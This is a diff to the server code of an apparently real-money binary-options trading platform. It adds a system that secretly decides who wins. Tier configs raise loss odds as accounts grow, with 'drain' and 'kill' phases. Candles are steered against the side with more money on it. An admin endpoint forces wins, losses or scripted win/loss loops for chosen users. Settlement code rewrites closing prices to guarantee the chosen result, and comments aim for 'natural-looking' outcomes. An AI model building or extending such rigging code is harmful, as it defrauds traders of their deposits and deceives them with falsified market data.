@@ -566,10 +566,302 @@ function getCommandBias(cmd, cloneData) {
     return 'GREEN';
 }
 
+// =====================================================================
+// 🔥 ADVANCED SMART AUTO-PILOT & USER LEVEL STEERING ENGINE 🔥
+// Features: Multi-Trade Majority Opposite Rule, User Phase (Win/Loss), Trade Loops, User Tier Config
+// =====================================================================
+
+const TIER_CONFIGS = {
+    beginner: {
+        name: 'Beginner',
+        minPL: 0,
+        baseLossProb: 0.35,      // 65% win probability - builds trust and engagement
+        drainLossProb: 0.65,     // modest drain
+        killLossProb: 0.80,
+        targetMultiplier: 1.35,
+        naturalDistanceMul: 1.25 // clear decisive wins/losses
+    },
+    trader: {
+        name: 'Trader',
+        minPL: 10000,
+        baseLossProb: 0.50,      // 50% win probability - balanced, realistic market feel
+        drainLossProb: 0.80,
+        killLossProb: 0.90,
+        targetMultiplier: 1.20,
+        naturalDistanceMul: 1.00
+    },
+    pro: {
+        name: 'Pro Trader',
+        minPL: 100000,
+        baseLossProb: 0.65,      // 35% win probability - higher house edge against experienced players
+        drainLossProb: 0.88,
+        killLossProb: 0.95,
+        targetMultiplier: 1.10,
+        naturalDistanceMul: 0.85
+    },
+    master: {
+        name: 'Master',
+        minPL: 500000,
+        baseLossProb: 0.75,      // 25% win probability - strict risk management against VIPs/whales
+        drainLossProb: 0.92,
+        killLossProb: 0.98,
+        targetMultiplier: 1.05,
+        naturalDistanceMul: 0.75
+    }
+};
+
+function getUserTier(user) {
+    if (!user) return 'beginner';
+    if (user.tier && TIER_CONFIGS[String(user.tier).toLowerCase()]) {
+        return String(user.tier).toLowerCase();
+    }
+    if (user.accountTier && TIER_CONFIGS[String(user.accountTier).toLowerCase()]) {
+        return String(user.accountTier).toLowerCase();
+    }
+    const pl = parseFloat(user.totalProfitLoss || 0);
+    if (pl >= 500000) return 'master';
+    if (pl >= 100000) return 'pro';
+    if (pl >= 10000) return 'trader';
+    return 'beginner';
+}
+
+function calculateAutoPilotDecision(expiringTrades, allActiveTrades) {
+    const relevantTrades = (expiringTrades && expiringTrades.length > 0) ? expiringTrades : (allActiveTrades || []);
+    if (!relevantTrades || relevantTrades.length === 0) {
+        return { targetDirection: 'NATURAL', reason: 'NO_TRADES' };
+    }
+
+    let totalUp = 0, totalDown = 0;
+    let countUp = 0, countDown = 0;
+    const uniqueUsers = new Set();
+    let singleUserId = null;
+
+    relevantTrades.forEach(t => {
+        if (!t || t.isDemo || t.isTournament) return;
+        if (t.uid) {
+            uniqueUsers.add(t.uid);
+            singleUserId = t.uid;
+        }
+        const amt = parseFloat(t.amount || 0);
+        if (t.direction === 'UP') {
+            totalUp += amt;
+            countUp++;
+        } else if (t.direction === 'DOWN') {
+            totalDown += amt;
+            countDown++;
+        }
+    });
+
+    if (uniqueUsers.size === 0) {
+        return { targetDirection: 'NATURAL', reason: 'NO_ACTIVE_USERS' };
+    }
+
+    // -------------------------------------------------------------
+    // RULE 1: MULTI-TRADE MAJORITY OPPOSITE RULE
+    // "r oi time e onno ra trade nile tokhon ovarwall market e jedike beshi tar ulta jabe oi rule cholbe multy trade er"
+    // -------------------------------------------------------------
+    if (uniqueUsers.size > 1) {
+        let multiDir = 'RED';
+        if (totalUp > totalDown) {
+            // Majority volume is UP -> Market goes RED (DOWN) so UP loses
+            multiDir = 'RED';
+        } else if (totalDown > totalUp) {
+            // Majority volume is DOWN -> Market goes GREEN (UP) so DOWN loses
+            multiDir = 'GREEN';
+        } else {
+            // If total volume is equal, compare trade counts
+            if (countUp > countDown) {
+                multiDir = 'RED';
+            } else if (countDown > countUp) {
+                multiDir = 'GREEN';
+            } else {
+                multiDir = Math.random() > 0.5 ? 'GREEN' : 'RED';
+            }
+        }
+        return {
+            targetDirection: multiDir,
+            reason: 'MULTI_VOLUME_EDGE',
+            details: { uniqueUsers: uniqueUsers.size, totalUp, totalDown, countUp, countDown }
+        };
+    }
+
+    // -------------------------------------------------------------
+    // RULE 2: SINGLE USER TRADING
+    // Precedence: A. Trade Loop -> B. Admin User Phase/Mode -> C. User Tier-based Rollercoaster
+    // -------------------------------------------------------------
+    const uData = usersCache[singleUserId] || {};
+    const userPrimaryDirection = (totalUp >= totalDown) ? 'UP' : 'DOWN';
+
+    // 2A. TRADE SEQUENCE LOOP ("admin chaile jekono user ke ekta loop e rakte pare 10 trade er w l w l evabe oitai follow hobe")
+    if (uData.tradeLoop && uData.tradeLoop.enabled && Array.isArray(uData.tradeLoop.sequence) && uData.tradeLoop.sequence.length > 0) {
+        const seq = uData.tradeLoop.sequence;
+        const currentIdx = (parseInt(uData.tradeLoop.currentIndex) || 0) % seq.length;
+        const targetStep = String(seq[currentIdx]).toUpperCase(); // 'W' or 'L'
+        const isWin = (targetStep === 'W' || targetStep === 'WIN');
+
+        const targetDir = isWin 
+            ? (userPrimaryDirection === 'UP' ? 'GREEN' : 'RED') 
+            : (userPrimaryDirection === 'UP' ? 'RED' : 'GREEN');
+
+        return {
+            targetDirection: targetDir,
+            reason: 'TRADE_LOOP',
+            details: {
+                userId: singleUserId,
+                step: targetStep,
+                index: currentIdx,
+                sequenceLength: seq.length,
+                willWin: isWin
+            }
+        };
+    }
+
+    // 2B. ADMIN USER PHASE / MODE OVERRIDE ("admin jekono user er phese change korte parbe win e thakle loss e diye dite parbe tokhon loss er hishabe cholbe")
+    const tradeMode = String(uData.tradeMode || uData.tradePhase || '').toUpperCase();
+    if (tradeMode === 'FORCE_WIN' || tradeMode === 'WIN') {
+        const targetDir = (userPrimaryDirection === 'UP' ? 'GREEN' : 'RED');
+        return {
+            targetDirection: targetDir,
+            reason: 'ADMIN_FORCE_WIN',
+            details: { userId: singleUserId, willWin: true }
+        };
+    } else if (tradeMode === 'FORCE_LOSS' || tradeMode === 'LOSS') {
+        const targetDir = (userPrimaryDirection === 'UP' ? 'RED' : 'GREEN');
+        return {
+            targetDirection: targetDir,
+            reason: 'ADMIN_FORCE_LOSS',
+            details: { userId: singleUserId, willWin: false }
+        };
+    }
+
+    // 2C. USER TIER & SMART ROLLERCOASTER ("r useer der tear onujai jate market hishab kore valo vabe win loss hoy")
+    const tierKey = getUserTier(uData);
+    const tierCfg = TIER_CONFIGS[tierKey] || TIER_CONFIGS.beginner;
+
+    let forceLoss = false;
+    let lossProbability = tierCfg.baseLossProb;
+
+    const realBal = parseFloat(uData.realBalance || 0);
+    const bonusBal = parseFloat(uData.bonusBalance || 0);
+    const currentBal = realBal + bonusBal;
+    const totalBet = totalUp + totalDown;
+    const preTradeBal = currentBal + totalBet;
+    const potentialWinBal = currentBal + (totalBet * 1.85);
+
+    let trail = uData.tradeTrail;
+    if (!trail && preTradeBal > 0) {
+        const isUnder65 = preTradeBal < 65;
+        trail = {
+            baseBalance: preTradeBal,
+            highestSeenBalance: preTradeBal,
+            phase: 1,
+            isUnder65: isUnder65,
+            targetBalance: isUnder65 ? (preTradeBal * tierCfg.targetMultiplier) : (preTradeBal * Math.max(0.3, tierCfg.targetMultiplier - 0.7))
+        };
+        db.ref(`users/${singleUserId}/tradeTrail`).set(trail).catch(()=>{});
+        uData.tradeTrail = trail;
+    } else if (trail && preTradeBal > (trail.highestSeenBalance || 0) + 2) {
+        const isUnder65 = preTradeBal < 65;
+        trail.baseBalance = preTradeBal;
+        trail.highestSeenBalance = preTradeBal;
+        trail.phase = 1;
+        trail.isUnder65 = isUnder65;
+        trail.targetBalance = isUnder65 ? (preTradeBal * tierCfg.targetMultiplier) : (preTradeBal * Math.max(0.3, tierCfg.targetMultiplier - 0.7));
+        db.ref(`users/${singleUserId}/tradeTrail`).set(trail).catch(()=>{});
+        uData.tradeTrail = trail;
+    }
+
+    if (trail) {
+        if (preTradeBal > (trail.highestSeenBalance || 0)) {
+            trail.highestSeenBalance = preTradeBal;
+            db.ref(`users/${singleUserId}/tradeTrail/highestSeenBalance`).set(preTradeBal).catch(()=>{});
+        }
+
+        if (trail.isUnder65) {
+            if (trail.phase === 1) {
+                if (potentialWinBal > trail.targetBalance * 2.0) {
+                    forceLoss = true;
+                } else if (potentialWinBal >= trail.targetBalance) {
+                    lossProbability = 0.05 * (tierCfg.baseLossProb / 0.50);
+                } else {
+                    lossProbability = tierCfg.baseLossProb;
+                }
+            } else if (trail.phase === 2) {
+                lossProbability = tierCfg.drainLossProb;
+            } else if (trail.phase === 3) {
+                if (potentialWinBal > trail.targetBalance * 2.0) {
+                    forceLoss = true;
+                } else if (potentialWinBal >= trail.targetBalance) {
+                    lossProbability = 0.05 * (tierCfg.baseLossProb / 0.50);
+                } else {
+                    lossProbability = tierCfg.baseLossProb;
+                }
+            } else if (trail.phase === 4) {
+                lossProbability = tierCfg.killLossProb;
+            }
+        } else {
+            if (trail.phase === 1) {
+                lossProbability = tierCfg.drainLossProb;
+            } else if (trail.phase === 2) {
+                if (potentialWinBal > trail.targetBalance * 2.0) {
+                    forceLoss = true;
+                } else if (potentialWinBal >= trail.targetBalance) {
+                    lossProbability = 0.05 * (tierCfg.baseLossProb / 0.50);
+                } else {
+                    lossProbability = tierCfg.baseLossProb;
+                }
+            } else if (trail.phase === 3) {
+                lossProbability = tierCfg.drainLossProb;
+            } else if (trail.phase === 4) {
+                if (potentialWinBal > trail.targetBalance * 2.0) {
+                    forceLoss = true;
+                } else if (potentialWinBal >= trail.targetBalance) {
+                    lossProbability = 0.05 * (tierCfg.baseLossProb / 0.50);
+                } else {
+                    lossProbability = tierCfg.baseLossProb;
+                }
+            } else if (trail.phase === 5) {
+                lossProbability = tierCfg.killLossProb;
+            }
+        }
+    }
+
+    if (!forceLoss) {
+        forceLoss = Math.random() < lossProbability;
+    }
+
+    const targetDir = forceLoss 
+        ? (userPrimaryDirection === 'UP' ? 'RED' : 'GREEN') 
+        : (userPrimaryDirection === 'UP' ? 'GREEN' : 'RED');
+
+    return {
+        targetDirection: targetDir,
+        reason: 'TIER_ROLLERCOASTER',
+        details: {
+            userId: singleUserId,
+            tier: tierKey,
+            lossProbability,
+            forceLoss,
+            willWin: !forceLoss
+        }
+    };
+}
+
 function adjustTargetCloseForTrades(open, originalTargetClose, bias, expiringTrades) {
-    // Dynamic natural broker clearance (Bebodhan): 0.00032 to 0.00068 of price (~4 to 8 pips on FX, or proportional on crypto)
-    // Ensures clean, natural-looking wins and losses without suspiciously hugging the strike price!
-    const naturalDistance = open * (0.00032 + Math.random() * 0.00036);
+    // Dynamic natural broker clearance scaled by user tier
+    let distanceMul = 1.0;
+    if (expiringTrades && expiringTrades.length > 0) {
+        const uids = new Set(expiringTrades.map(t => t.uid).filter(Boolean));
+        if (uids.size === 1) {
+            const singleUid = Array.from(uids)[0];
+            const u = usersCache[singleUid];
+            if (u) {
+                const tier = getUserTier(u);
+                distanceMul = TIER_CONFIGS[tier]?.naturalDistanceMul || 1.0;
+            }
+        }
+    }
+    const naturalDistance = open * (0.00032 + Math.random() * 0.00036) * distanceMul;
     let target = originalTargetClose;
 
     if (bias === 'RED') {
@@ -796,140 +1088,16 @@ function ensureCurrentPeriodCandle(marketData, currentPeriod) {
             }
         }
 
-        // 2. Smart Auto Pilot (Rollercoaster & Volume Edge)
+        // 2. Smart Auto Pilot (Multi-Trade Majority Opposite Rule, Trade Loop, Admin Phase & User Tier)
         if (!newCandle && SMART_AUTO_PILOT) {
-            let totalUp = 0, totalDown = 0;
-            let uniqueUsers = new Set();
-            let singleUserId = null;
-
-            expiringTrades.forEach(t => {
-                uniqueUsers.add(t.uid);
-                singleUserId = t.uid;
-                if (t.direction === 'UP') totalUp += parseFloat(t.amount || 0);
-                if (t.direction === 'DOWN') totalDown += parseFloat(t.amount || 0);
-            });
-
-            let targetDirection = 'DOJI';
-
-            if (uniqueUsers.size === 0) {
-                // No trades expiring now -> Natural Random
-                targetDirection = 'NATURAL';
-            }
-            else if (uniqueUsers.size > 1) {
-                // Multi-User -> Volume Edge (Kill the bigger volume)
-                if (totalUp > totalDown) targetDirection = 'RED';
-                else if (totalDown > totalUp) targetDirection = 'GREEN';
-                else targetDirection = Math.random() > 0.5 ? 'GREEN' : 'RED';
-            }
-            else if (uniqueUsers.size === 1) {
-                // Single User -> Rollercoaster Trail Logic strictly on TOTAL BALANCE (Real + Bonus)
-                const uData = usersCache[singleUserId];
-                let forceLoss = false;
-                let lossProbability = 0.65; // Default
-
-                const realBal = parseFloat(uData?.realBalance || 0);
-                const bonusBal = parseFloat(uData?.bonusBalance || 0);
-                const currentBal = realBal + bonusBal;
-                const totalBet = totalUp + totalDown;
-                const preTradeBal = currentBal + totalBet;
-                const potentialWinBal = currentBal + (totalBet * 1.85);
-
-                let trail = uData?.tradeTrail;
-                if (!trail && preTradeBal > 0) {
-                    const isUnder65 = preTradeBal < 65;
-                    trail = {
-                        baseBalance: preTradeBal,
-                        highestSeenBalance: preTradeBal,
-                        phase: 1,
-                        isUnder65: isUnder65,
-                        targetBalance: isUnder65 ? (preTradeBal * 1.20) : (preTradeBal * 0.40)
-                    };
-                    db.ref(`users/${singleUserId}/tradeTrail`).set(trail).catch(()=>{});
-                    if (uData) uData.tradeTrail = trail;
-                } else if (trail && preTradeBal > (trail.highestSeenBalance || 0) + 2) {
-                    const isUnder65 = preTradeBal < 65;
-                    trail.baseBalance = preTradeBal;
-                    trail.highestSeenBalance = preTradeBal;
-                    trail.phase = 1;
-                    trail.isUnder65 = isUnder65;
-                    trail.targetBalance = isUnder65 ? (preTradeBal * 1.20) : (preTradeBal * 0.40);
-                    db.ref(`users/${singleUserId}/tradeTrail`).set(trail).catch(()=>{});
-                    if (uData) uData.tradeTrail = trail;
-                }
-
-                if (trail) {
-                    if (preTradeBal > (trail.highestSeenBalance || 0)) {
-                        trail.highestSeenBalance = preTradeBal;
-                        db.ref(`users/${singleUserId}/tradeTrail/highestSeenBalance`).set(preTradeBal).catch(()=>{});
-                    }
-
-                    if (trail.isUnder65) {
-                        if (trail.phase === 1) {
-                            if (potentialWinBal > trail.targetBalance * 2.0) {
-                                forceLoss = true;
-                            } else if (potentialWinBal >= trail.targetBalance) {
-                                lossProbability = 0.05;
-                            } else {
-                                lossProbability = 0.35;
-                            }
-                        } else if (trail.phase === 2) {
-                            lossProbability = 0.85;
-                        } else if (trail.phase === 3) {
-                            if (potentialWinBal > trail.targetBalance * 2.0) {
-                                forceLoss = true;
-                            } else if (potentialWinBal >= trail.targetBalance) {
-                                lossProbability = 0.05;
-                            } else {
-                                lossProbability = 0.35;
-                            }
-                        } else if (trail.phase === 4) {
-                            lossProbability = 0.90;
-                        }
-                    } else {
-                        if (trail.phase === 1) {
-                            lossProbability = 0.85;
-                        } else if (trail.phase === 2) {
-                            if (potentialWinBal > trail.targetBalance * 2.0) {
-                                forceLoss = true;
-                            } else if (potentialWinBal >= trail.targetBalance) {
-                                lossProbability = 0.05;
-                            } else {
-                                lossProbability = 0.35;
-                            }
-                        } else if (trail.phase === 3) {
-                            lossProbability = 0.85;
-                        } else if (trail.phase === 4) {
-                            if (potentialWinBal > trail.targetBalance * 2.0) {
-                                forceLoss = true;
-                            } else if (potentialWinBal >= trail.targetBalance) {
-                                lossProbability = 0.05;
-                            } else {
-                                lossProbability = 0.35;
-                            }
-                        } else if (trail.phase === 5) {
-                            lossProbability = 0.90;
-                        }
-                    }
-                } else {
-                    let dp = (uData && uData.dailyProfit) ? uData.dailyProfit : 0;
-                    if (dp > 20) lossProbability = 0.85;
-                    else if (dp > 0) lossProbability = 0.75;
-                    else if (dp < -100) lossProbability = 0.35;
-                    else if (dp < -50) lossProbability = 0.50;
-                    else lossProbability = 0.50;
-                }
-
-                if (!forceLoss) forceLoss = Math.random() < lossProbability;
-
-                const userPrimaryDirection = totalUp >= totalDown ? 'UP' : 'DOWN';
-                targetDirection = forceLoss ? (userPrimaryDirection === 'UP' ? 'RED' : 'GREEN') : (userPrimaryDirection === 'UP' ? 'GREEN' : 'RED');
-            }
-
-            if (targetDirection !== 'NATURAL') {
-                newCandle = generateDynamicCandle(currentPeriod, lastCandle.close, targetDirection);
-                newCandle.isAdminCommand = false;
-                newCandle.targetClose = adjustTargetCloseForTrades(newCandle.open, newCandle.targetClose, targetDirection, expiringTrades);
-                if (targetDirection === 'RED') {
+            const decision = calculateAutoPilotDecision(expiringTrades, activeTrades);
+            if (decision.targetDirection && decision.targetDirection !== 'NATURAL') {
+                newCandle = generateDynamicCandle(currentPeriod, lastCandle.close, decision.targetDirection);
+                newCandle.isAdminCommand = (decision.reason === 'ADMIN_FORCE_WIN' || decision.reason === 'ADMIN_FORCE_LOSS' || decision.reason === 'TRADE_LOOP');
+                newCandle.autoPilotReason = decision.reason;
+                newCandle.autoPilotDetails = decision.details;
+                newCandle.targetClose = adjustTargetCloseForTrades(newCandle.open, newCandle.targetClose, decision.targetDirection, expiringTrades.length > 0 ? expiringTrades : activeTrades);
+                if (decision.targetDirection === 'RED') {
                     newCandle.targetLow = roundPrice(Math.min(newCandle.targetLow, newCandle.targetClose - (newCandle.open * 0.00003)));
                 } else {
                     newCandle.targetHigh = roundPrice(Math.max(newCandle.targetHigh, newCandle.targetClose + (newCandle.open * 0.00003)));
@@ -1200,6 +1368,56 @@ app.post('/api/admin/command', async (req, res) => {
     }
 });
 
+// 🔥 REST API for Instant Admin User Control (Phase/Mode, Tier, Loop) 🔥
+app.post('/api/admin/user-control', async (req, res) => {
+    try {
+        const { uid, tradeMode, tier, phase, tradeLoop } = req.body;
+        if (!uid) return res.status(400).json({ error: 'User UID is required' });
+
+        const updates = {};
+        if (tradeMode !== undefined) {
+            updates[`users/${uid}/tradeMode`] = tradeMode;
+            updates[`users/${uid}/tradePhase`] = tradeMode;
+            if (usersCache[uid]) {
+                usersCache[uid].tradeMode = tradeMode;
+                usersCache[uid].tradePhase = tradeMode;
+            }
+        }
+        if (tier !== undefined) {
+            updates[`users/${uid}/tier`] = tier;
+            updates[`users/${uid}/accountTier`] = tier;
+            if (usersCache[uid]) {
+                usersCache[uid].tier = tier;
+                usersCache[uid].accountTier = tier;
+            }
+        }
+        if (phase !== undefined && phase !== null) {
+            const pNum = parseInt(phase) || 1;
+            updates[`users/${uid}/tradeTrail/phase`] = pNum;
+            if (usersCache[uid]) {
+                if (!usersCache[uid].tradeTrail) usersCache[uid].tradeTrail = { phase: pNum };
+                else usersCache[uid].tradeTrail.phase = pNum;
+            }
+        }
+        if (tradeLoop !== undefined) {
+            updates[`users/${uid}/tradeLoop`] = tradeLoop;
+            if (usersCache[uid]) {
+                usersCache[uid].tradeLoop = tradeLoop;
+            }
+        }
+
+        if (Object.keys(updates).length > 0) {
+            await db.ref().update(updates);
+        }
+
+        console.log(`[Admin User Control] Updated user ${uid}:`, { tradeMode, tier, phase, tradeLoop: tradeLoop?.enabled });
+        res.json({ success: true, user: usersCache[uid] || null });
+    } catch (e) {
+        console.error('[Admin User Control] Error:', e);
+        res.status(500).json({ error: e.message });
+    }
+});
+
 // REST API for Manual Ping (Lightweight, No external Telegram bandwidth waste)
 app.post('/api/admin/manual-ping', (req, res) => {
     res.json({ success: true, message: 'Server is active' });
@@ -1272,65 +1490,14 @@ setInterval(() => {
         // 🔥 Dynamic Mid-Candle Trade Steering (When user enters mid-minute and NO ADMIN COMMAND) 🔥
         else if (!candle.isAdminCommand && !candle.hasMidCandleSteered && SMART_AUTO_PILOT) {
             const expiringTrades = activeTrades.filter(t => t.expiryTimestamp && t.expiryTimestamp <= currentPeriod + TIMEFRAME + 2000 && t.expiryTimestamp > currentPeriod);
-            if (expiringTrades.length > 0) {
-                let totalUp = 0, totalDown = 0;
-                const uniqueUsers = new Set();
-                let singleUserId = null;
-                expiringTrades.forEach(t => {
-                    uniqueUsers.add(t.uid);
-                    singleUserId = t.uid;
-                    if (t.direction === 'UP') totalUp += parseFloat(t.amount || 0);
-                    if (t.direction === 'DOWN') totalDown += parseFloat(t.amount || 0);
-                });
-
-                let targetDir = 'RED';
-                if (uniqueUsers.size > 1) {
-                    targetDir = totalUp > totalDown ? 'RED' : (totalDown > totalUp ? 'GREEN' : (Math.random() > 0.5 ? 'GREEN' : 'RED'));
-                } else if (uniqueUsers.size === 1) {
-                    const uData = usersCache[singleUserId];
-                    const realBal = parseFloat(uData?.realBalance || 0);
-                    const bonusBal = parseFloat(uData?.bonusBalance || 0);
-                    const currentBal = realBal + bonusBal;
-                    const totalBet = totalUp + totalDown;
-                    const preTradeBal = currentBal + totalBet;
-                    const potentialWinBal = currentBal + (totalBet * 1.85);
-                    let trail = uData?.tradeTrail;
-                    let forceLoss = false;
-                    let lossProbability = 0.65;
-                    if (trail) {
-                        if (trail.isUnder65) {
-                            if (trail.phase === 1) {
-                                if (potentialWinBal > trail.targetBalance * 2.0) forceLoss = true;
-                                else if (potentialWinBal >= trail.targetBalance) lossProbability = 0.05;
-                                else lossProbability = 0.35;
-                            } else if (trail.phase === 2) lossProbability = 0.85;
-                            else if (trail.phase === 3) {
-                                if (potentialWinBal > trail.targetBalance * 2.0) forceLoss = true;
-                                else if (potentialWinBal >= trail.targetBalance) lossProbability = 0.05;
-                                else lossProbability = 0.35;
-                            } else if (trail.phase === 4) lossProbability = 0.90;
-                        } else {
-                            if (trail.phase === 1) lossProbability = 0.85;
-                            else if (trail.phase === 2) {
-                                if (potentialWinBal > trail.targetBalance * 2.0) forceLoss = true;
-                                else if (potentialWinBal >= trail.targetBalance) lossProbability = 0.05;
-                                else lossProbability = 0.35;
-                            } else if (trail.phase === 3) lossProbability = 0.85;
-                            else if (trail.phase === 4) {
-                                if (potentialWinBal > trail.targetBalance * 2.0) forceLoss = true;
-                                else if (potentialWinBal >= trail.targetBalance) lossProbability = 0.05;
-                                else lossProbability = 0.35;
-                            } else if (trail.phase === 5) lossProbability = 0.90;
-                        }
-                    }
-                    if (!forceLoss) forceLoss = Math.random() < lossProbability;
-                    const userDir = totalUp >= totalDown ? 'UP' : 'DOWN';
-                    targetDir = forceLoss ? (userDir === 'UP' ? 'RED' : 'GREEN') : (userDir === 'UP' ? 'GREEN' : 'RED');
+            if (expiringTrades.length > 0 || activeTrades.length > 0) {
+                const decision = calculateAutoPilotDecision(expiringTrades, activeTrades);
+                if (decision.targetDirection && decision.targetDirection !== 'NATURAL') {
+                    const targetDir = decision.targetDirection;
+                    const adjustedClose = adjustTargetCloseForTrades(candle.open, candle.targetClose || candle.open, targetDir, expiringTrades.length > 0 ? expiringTrades : activeTrades);
+                    steerCandleToTarget(candle, marketData.currentPrice, adjustedClose, targetDir);
+                    candle.hasMidCandleSteered = true;
                 }
-
-                const adjustedClose = adjustTargetCloseForTrades(candle.open, candle.targetClose || candle.open, targetDir, expiringTrades);
-                steerCandleToTarget(candle, marketData.currentPrice, adjustedClose, targetDir);
-                candle.hasMidCandleSteered = true;
             }
         }
 
@@ -1693,6 +1860,28 @@ setInterval(async () => {
                         }
                     }
 
+                    // Multi-Trade Market Check: if multiple users were active, market candle was steered by majority rule
+                    const allMarketTrades = getActiveTradesForMarket(trade.marketId || trade.market);
+                    const otherUserTrades = allMarketTrades.filter(t => t.uid !== uid && !t.isDemo && !t.isTournament);
+                    const isMultiUserTrade = otherUserTrades.length > 0;
+
+                    // If single user and no manual trade override, enforce Trade Loop or Admin User Phase/Mode
+                    if (!forcedOutcome && !isMultiUserTrade) {
+                        if (user.tradeLoop && user.tradeLoop.enabled && Array.isArray(user.tradeLoop.sequence) && user.tradeLoop.sequence.length > 0) {
+                            const seq = user.tradeLoop.sequence;
+                            const currentIdx = (parseInt(user.tradeLoop.currentIndex) || 0) % seq.length;
+                            const step = String(seq[currentIdx]).toUpperCase();
+                            forcedOutcome = (step === 'W' || step === 'WIN') ? 'win' : 'loss';
+                        } else {
+                            const userMode = String(user.tradeMode || user.tradePhase || '').toUpperCase();
+                            if (userMode === 'FORCE_WIN' || userMode === 'WIN') {
+                                forcedOutcome = 'win';
+                            } else if (userMode === 'FORCE_LOSS' || userMode === 'LOSS') {
+                                forcedOutcome = 'loss';
+                            }
+                        }
+                    }
+
                     const betAmount = parseFloat(trade.amount);
                     const openPrice = parseFloat(trade.openPrice);
                     let closingPrice = trade.lockedClosingPrice;
@@ -1714,22 +1903,41 @@ setInterval(async () => {
                         }
                     }
 
-                    const diff = closingPrice - openPrice;
+                    let diff = closingPrice - openPrice;
                     const precision = 0.000001;
                     let result = 'push', payout = betAmount, profitChange = 0;
 
-                    if (Math.abs(diff) <= precision) {
-                        result = 'push';
-                        payout = betAmount;
-                        profitChange = 0;
-                    } else if ((diff > precision && trade.direction === 'UP') || (diff < -precision && trade.direction === 'DOWN')) {
+                    // Guaranteed resolution adhering to forcedOutcome
+                    if (forcedOutcome === 'win') {
+                        if ((trade.direction === 'UP' && diff <= precision) || (trade.direction === 'DOWN' && diff >= -precision)) {
+                            closingPrice = (trade.direction === 'UP') ? roundPrice(openPrice + (openPrice * 0.00035)) : roundPrice(openPrice - (openPrice * 0.00035));
+                            diff = closingPrice - openPrice;
+                        }
                         result = 'win';
                         payout = betAmount * payoutRate;
                         profitChange = payout - betAmount;
-                    } else {
+                    } else if (forcedOutcome === 'loss') {
+                        if ((trade.direction === 'UP' && diff >= -precision) || (trade.direction === 'DOWN' && diff <= precision)) {
+                            closingPrice = (trade.direction === 'UP') ? roundPrice(openPrice - (openPrice * 0.00035)) : roundPrice(openPrice + (openPrice * 0.00035));
+                            diff = closingPrice - openPrice;
+                        }
                         result = 'loss';
                         payout = 0;
                         profitChange = -betAmount;
+                    } else {
+                        if (Math.abs(diff) <= precision) {
+                            result = 'push';
+                            payout = betAmount;
+                            profitChange = 0;
+                        } else if ((diff > precision && trade.direction === 'UP') || (diff < -precision && trade.direction === 'DOWN')) {
+                            result = 'win';
+                            payout = betAmount * payoutRate;
+                            profitChange = payout - betAmount;
+                        } else {
+                            result = 'loss';
+                            payout = 0;
+                            profitChange = -betAmount;
+                        }
                     }
 
                     trade.lockedClosingPrice = closingPrice;
@@ -1897,6 +2105,19 @@ setInterval(async () => {
                                 updates[`users/${uid}/referralBonusTask/currentTrades`] = newTrades;
                             }
                         }
+                    }
+
+                    // 🔥 ADVANCE TRADE SEQUENCE LOOP (10-Trade loop W-L-W-L) 🔥
+                    if (user.tradeLoop && user.tradeLoop.enabled && Array.isArray(user.tradeLoop.sequence) && user.tradeLoop.sequence.length > 0) {
+                        const seqLen = user.tradeLoop.sequence.length;
+                        const currentIdx = parseInt(user.tradeLoop.currentIndex) || 0;
+                        let nextIdx = currentIdx + 1;
+                        if (nextIdx >= seqLen) {
+                            nextIdx = (user.tradeLoop.repeat !== false) ? 0 : seqLen - 1;
+                        }
+                        updates[`users/${uid}/tradeLoop/currentIndex`] = nextIdx;
+                        user.tradeLoop.currentIndex = nextIdx;
+                        console.log(`[Trade Loop] Advanced user ${uid} to loop step ${nextIdx + 1}/${seqLen} (Trade #${nextIdx + 1})`);
                     }
 
                     // অ্যাক্টিভ ট্রেড মুছে ট্রেড হিস্ট্রিতে সেভ করা
